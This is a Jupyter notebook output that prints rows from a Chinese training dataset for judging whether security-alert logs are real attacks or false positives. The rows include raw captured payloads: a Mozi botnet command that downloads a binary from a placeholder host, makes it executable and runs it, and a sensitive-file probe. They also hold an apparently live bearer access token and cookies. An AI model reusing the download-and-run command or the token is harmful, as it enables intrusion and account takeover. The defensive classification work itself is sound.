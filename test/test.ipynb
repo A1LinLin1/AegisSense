{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "32871273",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "DatasetDict({\n",
      "    train: Dataset({\n",
      "        features: ['instruction', 'input', 'output'],\n",
      "        num_rows: 65134\n",
      "    })\n",
      "})\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "{'instruction': ['你是一名网络安全告警分析专家，请分析以下安全告警日志，重点分析payload字段，判断输入的告警日志是真实攻击还是误报。请按照以下格式给出回答：\\n<reasoning>\\n...\\n</reasoning>\\n<answer>\\n...\\n</answer>\\n<answer>标签中请直接回答\"攻击\"或\"误报\"。',\n",
       "  '你是一名网络安全告警分析专家，请分析以下安全告警日志，重点分析payload字段，判断输入的告警日志是真实攻击还是误报。请按照以下格式给出回答：\\n<reasoning>\\n...\\n</reasoning>\\n<answer>\\n...\\n</answer>\\n<answer>标签中请直接回答\"攻击\"或\"误报\"。',\n",
       "  '你是一名网络安全告警分析专家，请分析以下安全告警日志，重点分析payload字段，判断输入的告警日志是真实攻击还是误报。请按照以下格式给出回答：\\n<reasoning>\\n...\\n</reasoning>\\n<answer>\\n...\\n</answer>\\n<answer>标签中请直接回答\"攻击\"或\"误报\"。',\n",
       "  '你是一名网络安全告警分析专家，请分析以下安全告警日志，重点分析payload字段，判断输入的告警日志是真实攻击还是误报。请按照以下格式给出回答：\\n<reasoning>\\n...\\n</reasoning>\\n<answer>\\n...\\n</answer>\\n<answer>标签中请直接回答\"攻击\"或\"误报\"。',\n",
       "  '你是一名网络安全告警分析专家，请分析以下安全告警日志，重点分析payload字段，判断输入的告警日志是真实攻击还是误报。请按照以下格式给出回答：\\n<reasoning>\\n...\\n</reasoning>\\n<answer>\\n...\\n</answer>\\n<answer>标签中请直接回答\"攻击\"或\"误报\"。'],\n",
       " 'input': ['{\"write_date\": \"1732722399\", \"rule_version_str\": \"3.0.1122.14572\", \"dip_group\": \"省公司\", \"nid\": \"\", \"sip_group\": \"\", \"type\": \"信息泄露\", \"_origin\": {\"write_date\": 1732722399, \"vuln_harm\": \"服务器敏感信息一旦泄露会导致攻击者获得重要信息，增加攻击成功率。\", \"rule_version_str\": \"3.0.1122.14572\", \"hit_field\": \"\", \"dip\": \"172.31.192.209\", \"site_app\": \"\", \"hit_end\": 0, \"uri\": \"/gateway/support/oss/getPublicInputStream?filePath=/etc/anacrontab\", \"dport\": 473, \"vuln_name\": \"敏感信息扫描(机器学习)\", \"rsp_status\": 200, \"code_language\": \"\", \"solution\": \"请确认服务器是否存在相关文件，如果存在，可考虑迁移或删除敏感信息文件。\", \"hit_start\": 0, \"detail_info\": \"发现正在探测敏感信息文件，敏感的文件包括数据库文件、整站压缩文件、服务器或框架重要的配置文件、日志文件、压缩文件等。\", \"xff\": \"\", \"sip\": \"183.209.50.59\", \"vuln_desc\": \"发现正在探测敏感信息文件，敏感的文件包括数据库文件、整站压缩文件、服务器或框架重要的配置文件、日志文件、压缩文件等。\", \"public_date\": \"2020-11-25 19:44:12\", \"sport\": 36228}, \"detail_info\": \"发现正在探测敏感信息文件，敏感的文件包括数据库文件、整站压缩文件、服务器或框架重要的配置文件、日志文件、压缩文件等。\", \"file_md5\": \"\", \"rule_key\": \"webids\", \"connection\": \"keep-alive\", \"api\": \"zhny.hn.sgcc.com.cn/gateway/support/oss/getPublicInputStream\", \"first_access_time\": \"2024-11-27 23:46:39\", \"hazard_level\": \"2\", \"cookie\": \"sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%22191d59a55edcf2-05bd8f349acb414-26001e51-2073600-191d59a55eef89%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%2C%22%24latest_referrer_host%22%3A%22%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTkxZDU5YTU1ZWRjZjItMDViZDhmMzQ5YWNiNDE0LTI2MDAxZTUxLTIwNzM2MDAtMTkxZDU5YTU1ZWVmODkifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%221935eec21f6967-011a48e8b28415-26001151-2073600-1935eec21f814be%22%7D; access_token=Bearer%20eyJhbGciOiJIUzUxMiJ9.eyJzeXNUeXBlIjoiWkhOWV9XRUIiLCJhdXRob3JpdGllc1NldCI6WyIwMjE4Il0sImZpcnN0TG9naW4iOmZhbHNlLCJsb2dpblR5cGUiOiJVU0VSTkFNRV9QV0QiLCJyb2xlcyI6IiIsInNvdXJjZSI6IjAxIiwicm9sZXNTZXQiOltdLCJlbmFibGVkIjoxLCJ0b2tlbktleSI6ImFzYWZhZmYuMjAyNDExMjcwMDUwMDQ3MDMiLCJleHBpcmVkIjowLCJsb2dpblRpbWUiOjE3MzI2Mzk4MDQ3MDMsInVzZXJTdGF0ZSI6MSwiaWQiOjIwMDMwMjk5LCJsb2NrZWQiOjAsImlhdCI6MTczMjYzOTgwNCwiZ3JvdXBDb2RlIjoiMDIxOCIsImlzU2VydmljZVN0YXRpb24iOjAsImlzQ2hpbGRVc2VyIjpmYWxzZSwiYXV0aG9yaXRpZXNHQSI6W3siYXV0aG9yaXR5IjoiMDIxOCJ9XSwicHJvdG9jb2xTaWduIjoiMSIsImF1dGhvcml0aWVzIjoiMDIxOCIsImhvbWVSb3V0ZXIiOiIvc3lzU2V0dGluZy9wZXJzb25hbENlbnRlciIsInBob25lIjoiMTgwNjE4NDM5MjciLCJ1c2VyVHlwZSI6MCwicHdkRXhwaXJhdGlvblRpbWUiOjE3MzczMDA1NTIwMDAsInVzZXJuYW1lIjoiYXNhZmFmZiJ9.OqXAUbMFHWOcZ56OrQVcgKnQOVjLMSv4hof5lH_JKvrmqCN8QJK0407KxtQJttJ4ZTKH7NBTk6vFNiNwVFRDLQ; uuid=20030299\", \"hazard_rating\": \"低危\", \"hit_field\": \"\", \"h_method\": \"GET\", \"sip_addr\": \"中国--江苏省--南京市\", \"x_forwarded_for\": \"\", \"accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\", \"device_ip\": \"172.31.191.7\", \"alarm_source\": \"天眼分析平台-8\", \"vuln_name\": \"敏感信息扫描(机器学习)\", \"alarm_sip\": \"172.31.192.209\", \"skyeye_index\": \"\", \"sip_ioc_dip\": \"17723502529a7dc0b6f137d092be2e56\", \"xff\": \"\", \"vuln_desc\": \"发现正在探测敏感信息文件，敏感的文件包括数据库文件、整站压缩文件、服务器或框架重要的配置文件、日志文件、压缩文件等。\", \"attack_chain\": \"0x01010000\", \"vuln_harm\": \"服务器敏感信息一旦泄露会导致攻击者获得重要信息，增加攻击成功率。\", \"sec-fetch-user\": \"?1\", \"dport\": \"473\", \"alert_devip\": \"172.31.191.8\", \"update_time\": \"1732722338\", \"code_language\": \"\", \"sec-ch-ua-mobile\": \"?0\", \"public_date\": \"2020-11-25 19:44:12\", \"skyeye_serial_num\": \"QbJK/jYtc\", \"sec-fetch-mode\": \"navigate\", \"site_app\": \"\", \"super_attack_chain\": \"0x01000000\", \"hit_end\": \"0\", \"h_proto_version\": \"HTTP/1.1\", \"uri\": \"/gateway/support/oss/getPublicInputStream?filePath=/etc/anacrontab\", \"dst_mac\": \"00:24:ac:dd:9d:fb\", \"is_delete\": \"0\", \"rule_id\": \"0x10020b6a\", \"sec-ch-ua\": \"\\\\\"Chromium\\\\\";v=\\\\\"128\\\\\", \\\\\"Not;A=Brand\\\\\";v=\\\\\"24\\\\\", \\\\\"Google Chrome\\\\\";v=\\\\\"128\\\\\"\", \"attack_org\": \"\", \"is_white\": \"0\", \"alarm_sample\": \"1\", \"attack_sip\": \"183.209.50.59\", \"host_md5\": \"8264552e08a54b43da4a95c89edc9c8b\", \"user-agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36\", \"sec-fetch-dest\": \"document\", \"vlan_id\": \"\", \"vuln_type\": \"敏感信息扫描(机器学习)\", \"attack_type\": \"敏感信息/重要文件泄漏\", \"is_web_attack\": \"1\", \"dip\": \"172.31.192.209\", \"repeat_count\": \"1\", \"skyeye_type\": \"webids-webattack_dolog\", \"solution\": \"请确认服务器是否存在相关文件，如果存在，可考虑迁移或删除敏感信息文件。\", \"hit_start\": \"0\", \"filepath\": \"/etc/anacrontab\", \"skyeye_id\": \"\", \"payload\": {\"req_header\": \"R0VUIC9nYXRld2F5L3N1cHBvcnQvb3NzL2dldFB1YmxpY0lucHV0U3RyZWFtP2ZpbGVQYXRoPS9ldGMvYW5hY3JvbnRhYiBIVFRQLzEuMQ0KSG9zdDogemhueS5obi5zZ2NjLmNvbS5jbg0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0Kc2VjLWNoLXVhOiAiQ2hyb21pdW0iO3Y9IjEyOCIsICJOb3Q7QT1CcmFuZCI7dj0iMjQiLCAiR29vZ2xlIENocm9tZSI7dj0iMTI4Ig0Kc2VjLWNoLXVhLW1vYmlsZTogPzANCnNlYy1jaC11YS1wbGF0Zm9ybTogIldpbmRvd3MiDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTI4LjAuMC4wIFNhZmFyaS81MzcuMzYNCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC43DQpTZWMtRmV0Y2gtU2l0ZTogbm9uZQ0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtVXNlcjogPzENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KQWNjZXB0LUxhbmd1YWdlOiB6aC1DTix6aDtxPTAuOSxlbjtxPTAuOA0KQ29va2llOiBzZW5zb3JzZGF0YTIwMTVqc3Nka2Nyb3NzPSU3QiUyMmRpc3RpbmN0X2lkJTIyJTNBJTIyMTkxZDU5YTU1ZWRjZjItMDViZDhmMzQ5YWNiNDE0LTI2MDAxZTUxLTIwNzM2MDAtMTkxZDU5YTU1ZWVmODklMjIlMkMlMjJmaXJzdF9pZCUyMiUzQSUyMiUyMiUyQyUyMnByb3BzJTIyJTNBJTdCJTIyJTI0bGF0ZXN0X3RyYWZmaWNfc291cmNlX3R5cGUlMjIlM0ElMjIlRTclOUIlQjQlRTYlOEUlQTUlRTYlQjUlODElRTklODclOEYlMjIlMkMlMjIlMjRsYXRlc3Rfc2VhcmNoX2tleXdvcmQlMjIlM0ElMjIlRTYlOUMlQUElRTUlOEYlOTYlRTUlODglQjAlRTUlODAlQkNfJUU3JTlCJUI0JUU2JThFJUE1JUU2JTg5JTkzJUU1JUJDJTgwJTIyJTJDJTIyJTI0bGF0ZXN0X3JlZmVycmVyJTIyJTNBJTIyJTIyJTJDJTIyJTI0bGF0ZXN0X3JlZmVycmVyX2hvc3QlMjIlM0ElMjIlMjIlN0QlMkMlMjJpZGVudGl0aWVzJTIyJTNBJTIyZXlJa2FXUmxiblJwZEhsZlkyOXZhMmxsWDJsa0lqb2lNVGt4WkRVNVlUVTFaV1JqWmpJdE1EVmlaRGhtTXpRNVlXTmlOREUwTFRJMk1EQXhaVFV4TFRJd056TTJNREF0TVRreFpEVTVZVFUxWldWbU9Ea2lmUSUzRCUzRCUyMiUyQyUyMmhpc3RvcnlfbG9naW5faWQlMjIlM0ElN0IlMjJuYW1lJTIyJTNBJTIyJTIyJTJDJTIydmFsdWUlMjIlM0ElMjIlMjIlN0QlMkMlMjIlMjRkZXZpY2VfaWQlMjIlM0ElMjIxOTM1ZWVjMjFmNjk2Ny0wMTFhNDhlOGIyODQxNS0yNjAwMTE1MS0yMDczNjAwLTE5MzVlZWMyMWY4MTRiZSUyMiU3RDsgYWNjZXNzX3Rva2VuPUJlYXJlciUyMGV5SmhiR2NpT2lKSVV6VXhNaUo5LmV5SnplWE5VZVhCbElqb2lXa2hPV1Y5WFJVSWlMQ0poZFhSb2IzSnBkR2xsYzFObGRDSTZXeUl3TWpFNElsMHNJbVpwY25OMFRHOW5hVzRpT21aaGJITmxMQ0pzYjJkcGJsUjVjR1VpT2lKVlUwVlNUa0ZOUlY5UVYwUWlMQ0p5YjJ4bGN5STZJaUlzSW5OdmRYSmpaU0k2SWpBeElpd2ljbTlzWlhOVFpYUWlPbHRkTENKbGJtRmliR1ZrSWpveExDSjBiMnRsYmt0bGVTSTZJbUZ6WVdaaFptWXVNakF5TkRFeE1qY3dNRFV3TURRM01ETWlMQ0psZUhCcGNtVmtJam93TENKc2IyZHBibFJwYldVaU9qRTNNekkyTXprNE1EUTNNRE1zSW5WelpYSlRkR0YwWlNJNk1Td2lhV1FpT2pJd01ETXdNams1TENKc2IyTnJaV1FpT2pBc0ltbGhkQ0k2TVRjek1qWXpPVGd3TkN3aVozSnZkWEJEYjJSbElqb2lNREl4T0NJc0ltbHpVMlZ5ZG1salpWTjBZWFJwYjI0aU9qQXNJbWx6UTJocGJHUlZjMlZ5SWpwbVlXeHpaU3dpWVhWMGFHOXlhWFJwWlhOSFFTSTZXM3NpWVhWMGFHOXlhWFI1SWpvaU1ESXhPQ0o5WFN3aWNISnZkRzlqYjJ4VGFXZHVJam9pTVNJc0ltRjFkR2h2Y21sMGFXVnpJam9pTURJeE9DSXNJbWh2YldWU2IzVjBaWElpT2lJdmMzbHpVMlYwZEdsdVp5OXdaWEp6YjI1aGJFTmxiblJsY2lJc0luQm9iMjVsSWpvaU1UZ3dOakU0TkRNNU1qY2lMQ0oxYzJWeVZIbHdaU0k2TUN3aWNIZGtSWGh3YVhKaGRHbHZibFJwYldVaU9qRTNNemN6TURBMU5USXdNREFzSW5WelpYSnVZVzFsSWpvaVlYTmhabUZtWmlKOS5PcVhBVWJNRkhXT2NaNTZPclFWY2dLblFPVmpMTVN2NGhvZjVsSF9KS3ZybXFDTjhRSkswNDA3S3h0UUp0dEo0WlRLSDdOQlRrNnZGTmlOd1ZGUkRMUTsgdXVpZD0yMDAzMDI5OQ0KDQo=\", \"req_body\": \"\", \"rsp_header\": \"SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IG5naW54DQpEYXRlOiBXZWQsIDI3IE5vdiAyMDI0IDE1OjQ2OjM5IEdNVA0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uO2NoYXJzZXQ9VVRGLTgNCkNvbnRlbnQtTGVuZ3RoOiAxMzcNCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNClZhcnk6IE9yaWdpbg0KVmFyeTogQWNjZXNzLUNvbnRyb2wtUmVxdWVzdC1NZXRob2QNClZhcnk6IEFjY2Vzcy1Db250cm9sLVJlcXVlc3QtSGVhZGVycw0KWC1GcmFtZS1PcHRpb25zOiBBbGxvd0FsbA0KUmVmZXJyZXItUG9saWN5OiBuby1yZWZlcnJlcg0KWC1Eb3dubG9hZC1PcHRpb25zOiBub29wZW4NClN0cmljdC1UcmFuc3BvcnQtU2VjdXJpdHk6IG1heC1hZ2U9MTU1NTIwMDANCkNvbnRlbnQtU2VjdXJpdHktUG9saWN5OiBkZWZhdWx0LXNyYyAnc2VsZicgc3RhdGljNC5zZWd3YXkuY29tKOivpeWcsOWdgOaMiemcgOS/ruaUuSkgJ3Vuc2FmZS1pbmxpbmUnICd1bnNhZmUtZXZhbCcgYmxvYjogZGF0YTogOw0KWC1Db250ZW50LVR5cGUtT3B0aW9uczogbm9zbmlmZg0KWC1YU1MtUHJvdGVjdGlvbjogMTttb2RlPWJsb2NrDQpYLVBlcm1pdHRlZC1Dcm9zcy1Eb21haW4tUG9saWNpZXM6IG5vbmUNCg0K\", \"rsp_body\": \"ewoJImNvZGUiOjUwMCwKCSJtZXNzYWdlIjoi6Z2e5rOV6Lev5b6E77yM6K+l5o6l5Y+j5LuF5o+Q5L6bcHVibGlj55uu5b2V5LiL5paH5Lu25rWB6I635Y+WIiwKCSJwYWdlIjpudWxsLAoJInJlc3VsdCI6bnVsbCwKCSJ0aW1lIjpudWxsCn0=\"}, \"host\": \"zhny.hn.sgcc.com.cn\", \"host_state\": \"企图\", \"accept-language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"rsp_body\": \"{\\\\n\\\\t\\\\\"code\\\\\":500,\\\\n\\\\t\\\\\"message\\\\\":\\\\\"非法路径，该接口仅提供public目录下文件流获取\\\\\",\\\\n\\\\t\\\\\"page\\\\\":null,\\\\n\\\\t\\\\\"result\\\\\":null,\\\\n\\\\t\\\\\"time\\\\\":null\\\\n}\", \"rule_desc\": \"网页漏洞利用\", \"proto\": \"http\", \"alarm_id\": \"20241127_f74d1c21cac0d5abacccd10a1b3ac7ca\", \"access_time\": \"2024-11-27 23:46:39\", \"attack_addr\": \"中国--江苏省--南京市(32.053245/118.766351)\", \"sec-fetch-site\": \"none\", \"type_chain\": \"16160000\", \"dip_addr\": \"中国--湖南省--长沙市\", \"rsp_status\": \"200\", \"branch_id\": \"QbJK/fzEi\", \"att_ck\": \"初始访问:TA0001|利用面向公众的应用程序:T1190\", \"upgrade-insecure-requests\": \"1\", \"sip\": \"183.209.50.59\", \"dimension\": \"3\", \"url_path\": \"/gateway/support/oss/getPublicInputStream\", \"src_mac\": \"00:24:ac:22:84:33\", \"file_name\": \"\", \"confidence\": \"高\", \"rsp_header\": \"HTTP/1.1 200 OK\\\\r\\\\nServer: nginx\\\\r\\\\nDate: Wed, 27 Nov 2024 15:46:39 GMT\\\\r\\\\nContent-Type: application/json;charset=UTF-8\\\\r\\\\nContent-Length: 137\\\\r\\\\nConnection: keep-alive\\\\r\\\\nVary: Origin\\\\r\\\\nVary: Access-Control-Request-Method\\\\r\\\\nVary: Access-Control-Request-Headers\\\\r\\\\nX-Frame-Options: AllowAll\\\\r\\\\nReferrer-Policy: no-referrer\\\\r\\\\nX-Download-Options: noopen\\\\r\\\\nStrict-Transport-Security: max-age=15552000\\\\r\\\\nContent-Security-Policy: default-src \\'self\\' static4.segway.com(该地址按需修改) \\'unsafe-inline\\' \\'unsafe-eval\\' blob: data: ;\\\\r\\\\nX-Content-Type-Options: nosniff\\\\r\\\\nX-XSS-Protection: 1;mode=block\\\\r\\\\nX-Permitted-Cross-Domain-Policies: none\\\\r\\\\n\\\\r\\\\n\", \"super_type\": \"攻击利用\", \"serial_num\": \"QbJK/jYtc\", \"tcp_option\": \"\", \"req_header\": \"GET /gateway/support/oss/getPublicInputStream?filePath=/etc/anacrontab HTTP/1.1\\\\r\\\\nHost: zhny.hn.sgcc.com.cn\\\\r\\\\nConnection: keep-alive\\\\r\\\\nsec-ch-ua: \\\\\"Chromium\\\\\";v=\\\\\"128\\\\\", \\\\\"Not;A=Brand\\\\\";v=\\\\\"24\\\\\", \\\\\"Google Chrome\\\\\";v=\\\\\"128\\\\\"\\\\r\\\\nsec-ch-ua-mobile: ?0\\\\r\\\\nsec-ch-ua-platform: \\\\\"Windows\\\\\"\\\\r\\\\nUpgrade-Insecure-Requests: 1\\\\r\\\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36\\\\r\\\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\\\\r\\\\nSec-Fetch-Site: none\\\\r\\\\nSec-Fetch-Mode: navigate\\\\r\\\\nSec-Fetch-User: ?1\\\\r\\\\nSec-Fetch-Dest: document\\\\r\\\\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\\\\r\\\\nCookie: sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%22191d59a55edcf2-05bd8f349acb414-26001e51-2073600-191d59a55eef89%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%2C%22%24latest_referrer_host%22%3A%22%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTkxZDU5YTU1ZWRjZjItMDViZDhmMzQ5YWNiNDE0LTI2MDAxZTUxLTIwNzM2MDAtMTkxZDU5YTU1ZWVmODkifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%221935eec21f6967-011a48e8b28415-26001151-2073600-1935eec21f814be%22%7D; access_token=Bearer%20eyJhbGciOiJIUzUxMiJ9.eyJzeXNUeXBlIjoiWkhOWV9XRUIiLCJhdXRob3JpdGllc1NldCI6WyIwMjE4Il0sImZpcnN0TG9naW4iOmZhbHNlLCJsb2dpblR5cGUiOiJVU0VSTkFNRV9QV0QiLCJyb2xlcyI6IiIsInNvdXJjZSI6IjAxIiwicm9sZXNTZXQiOltdLCJlbmFibGVkIjoxLCJ0b2tlbktleSI6ImFzYWZhZmYuMjAyNDExMjcwMDUwMDQ3MDMiLCJleHBpcmVkIjowLCJsb2dpblRpbWUiOjE3MzI2Mzk4MDQ3MDMsInVzZXJTdGF0ZSI6MSwiaWQiOjIwMDMwMjk5LCJsb2NrZWQiOjAsImlhdCI6MTczMjYzOTgwNCwiZ3JvdXBDb2RlIjoiMDIxOCIsImlzU2VydmljZVN0YXRpb24iOjAsImlzQ2hpbGRVc2VyIjpmYWxzZSwiYXV0aG9yaXRpZXNHQSI6W3siYXV0aG9yaXR5IjoiMDIxOCJ9XSwicHJvdG9jb2xTaWduIjoiMSIsImF1dGhvcml0aWVzIjoiMDIxOCIsImhvbWVSb3V0ZXIiOiIvc3lzU2V0dGluZy9wZXJzb25hbENlbnRlciIsInBob25lIjoiMTgwNjE4NDM5MjciLCJ1c2VyVHlwZSI6MCwicHdkRXhwaXJhdGlvblRpbWUiOjE3MzczMDA1NTIwMDAsInVzZXJuYW1lIjoiYXNhZmFmZiJ9.OqXAUbMFHWOcZ56OrQVcgKnQOVjLMSv4hof5lH_JKvrmqCN8QJK0407KxtQJttJ4ZTKH7NBTk6vFNiNwVFRDLQ; uuid=20030299\\\\r\\\\n\\\\r\\\\n\", \"req_body\": \"\", \"sec-ch-ua-platform\": \"\\\\\"Windows\\\\\"\", \"rule_state\": \"green\", \"asset_group\": \"省公司\", \"ioc\": \"268569450-敏感信息扫描(机器学习)\", \"rule_labels\": \"{}\", \"sport\": \"36228\", \"h_url\": \"/gateway/support/oss/getPublicInputStream?filePath=/etc/anacrontab\"}',\n",
       "  '{\"write_date\": \"1732720892\", \"vlan_id\": \"\", \"vuln_type\": \"Shell命令执行(机器学习)\", \"rule_version_str\": \"3.0.1122.14572\", \"attack_type\": \"命令执行\", \"dip_group\": \"未分配资产组\", \"is_web_attack\": \"1\", \"nid\": \"\", \"dip\": \"172.31.193.243\", \"sip_group\": \"\", \"repeat_count\": \"1\", \"type\": \"命令执行\", \"skyeye_type\": \"webids-webattack_dolog\", \"_origin\": {\"write_date\": 1732720892, \"vuln_harm\": \"shell命令执行攻击是危害极高的攻击形式，攻击成功可以造成服务器被控制。\", \"rule_version_str\": \"3.0.1122.14572\", \"hit_field\": \"\", \"dip\": \"172.31.193.243\", \"site_app\": \"\", \"hit_end\": 0, \"uri\": \"/boaform/admin/formLogin?username=ec8&psd=ec8\", \"dport\": 80, \"vuln_name\": \"Shell命令执行(机器学习)\", \"rsp_status\": 0, \"code_language\": \"\", \"solution\": \"后端服务器语言中，严禁执行shell命令。\", \"hit_start\": 0, \"detail_info\": \"通过机器学习方式，检测到访问中存在shell命令执行攻击代码。\", \"xff\": \"\", \"sip\": \"117.209.87.214\", \"vuln_desc\": \"通过机器学习方式，检测到访问中存在shell命令执行攻击代码。\", \"public_date\": \"2020-11-25 19:51:41\", \"sport\": 34454}, \"solution\": \"后端服务器语言中，严禁执行shell命令。\", \"hit_start\": \"0\", \"skyeye_id\": \"\", \"payload\": {\"req_header\": \"R0VUIC9ib2Fmb3JtL2FkbWluL2Zvcm1Mb2dpbj91c2VybmFtZT1lYzgmcHNkPWVjOCBIVFRQLzEuMA0KDQo=\", \"req_body\": \"MjBodHRwOi8vJXM6JWQvTW96aS5tJTIwLU8lMjAtPiUyMC90bXAvTmV0bGluay5tO2NobW9kJTIwNzc3JTIwL3RtcC9OZXRsaW5rLm07L3RtcC9OZXRsaW5rLm0md2FuaW5mPTFfSU5URVJORVRfUl9WSURfMTU0IEhUVFAvMS4wDQoNCg==\", \"rsp_header\": \"\", \"rsp_body\": \"\"}, \"detail_info\": \"通过机器学习方式，检测到访问中存在shell命令执行攻击代码。\", \"file_md5\": \"\", \"host\": \"\", \"host_state\": \"失败\", \"rule_key\": \"webids\", \"api\": \"\", \"first_access_time\": \"2024-11-27 23:21:32\", \"hazard_level\": \"6\", \"hazard_rating\": \"高危\", \"hit_field\": \"\", \"rsp_body\": \"\", \"h_method\": \"GET\", \"sip_addr\": \"印度--卡纳塔克邦--班加罗尔\", \"x_forwarded_for\": \"\", \"device_ip\": \"172.31.191.58\", \"alarm_source\": \"天眼分析平台-57\", \"vuln_name\": \"Shell命令执行(机器学习)\", \"alarm_sip\": \"172.31.193.243\", \"rule_desc\": \"网页漏洞利用\", \"skyeye_index\": \"\", \"sip_ioc_dip\": \"8b2b9022528f7952784134376ab9e5b5\", \"proto\": \"http\", \"xff\": \"\", \"alarm_id\": \"20241127_00cea921e5f095068f8fa263a9c84c80\", \"vuln_desc\": \"通过机器学习方式，检测到访问中存在shell命令执行攻击代码。\", \"attack_chain\": \"0x02020000\", \"access_time\": \"2024-11-27 23:21:32\", \"psd\": \"ec8\", \"attack_addr\": \"印度--卡纳塔克邦--班加罗尔(12.977788/77.607407)\", \"type_chain\": \"16090000\", \"vuln_harm\": \"shell命令执行攻击是危害极高的攻击形式，攻击成功可以造成服务器被控制。\", \"dip_addr\": \"局域网\", \"dport\": \"80\", \"alert_devip\": \"172.31.191.57\", \"rsp_status\": \"0\", \"update_time\": \"1732720871\", \"code_language\": \"\", \"branch_id\": \"QbJK/5PW2\", \"att_ck\": \"初始访问:TA0001|利用面向公众的应用程序:T1190\", \"sip\": \"117.209.87.214\", \"public_date\": \"2020-11-25 19:51:41\", \"dimension\": \"3\", \"skyeye_serial_num\": \"QbJK/8ze/\", \"url_path\": \"/boaform/admin/formLogin\", \"src_mac\": \"00:94:a1:5e:6e:87\", \"file_name\": \"\", \"confidence\": \"高\", \"rsp_header\": \"\", \"super_type\": \"攻击利用\", \"site_app\": \"\", \"super_attack_chain\": \"0x02000000\", \"hit_end\": \"0\", \"h_proto_version\": \"HTTP/1.0\\\\n\\\\n\", \"serial_num\": \"QbJK/8ze/\", \"uri\": \"/boaform/admin/formLogin?username=ec8&psd=ec8\", \"dst_mac\": \"00:24:ac:dd:9d:fb\", \"is_delete\": \"0\", \"tcp_option\": \"\", \"rule_id\": \"0x10020b6e\", \"req_header\": \"GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0\\\\r\\\\n\\\\r\\\\n\", \"req_body\": \"20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Netlink.m;chmod%20777%20/tmp/Netlink.m;/tmp/Netlink.m&waninf=1_INTERNET_R_VID_154 HTTP/1.0\\\\r\\\\n\\\\r\\\\n\", \"attack_org\": \"\", \"is_white\": \"0\", \"alarm_sample\": \"1\", \"attack_sip\": \"117.209.87.214\", \"rule_state\": \"green\", \"asset_group\": \"未分配资产组\", \"ioc\": \"268569454-Shell命令执行(机器学习)\", \"rule_labels\": \"{}\", \"host_md5\": \"d41d8cd98f00b204e9800998ecf8427e\", \"sport\": \"34454\", \"h_url\": \"/boaform/admin/formLogin?username=ec8&psd=ec8\", \"username\": \"ec8\"}',\n",
       "  '{\"write_date\": \"1732720026\", \"vlan_id\": \"\", \"vuln_type\": \"发现黑客工具Masscan扫描行为\", \"rule_version_str\": \"3.0.1122.14572\", \"attack_type\": \"黑市工具\", \"dip_group\": \"未分配资产组\", \"is_web_attack\": \"1\", \"nid\": \"\", \"dip\": \"172.31.193.243\", \"sip_group\": \"\", \"repeat_count\": \"1\", \"type\": \"黑市工具\", \"skyeye_type\": \"webids-webattack_dolog\", \"_origin\": {\"write_date\": 1732720026, \"vuln_harm\": \"攻击者可通过Masscan快速获悉目标端口的状态，并针对开启的端口进行攻击。\", \"rule_version_str\": \"3.0.1122.14572\", \"hit_field\": \"req_header\", \"dip\": \"172.31.193.243\", \"site_app\": \"\", \"hit_end\": 39, \"uri\": \"/\", \"dport\": 80, \"vuln_name\": \"发现黑客工具Masscan扫描行为\", \"rsp_status\": 0, \"code_language\": \"\", \"solution\": 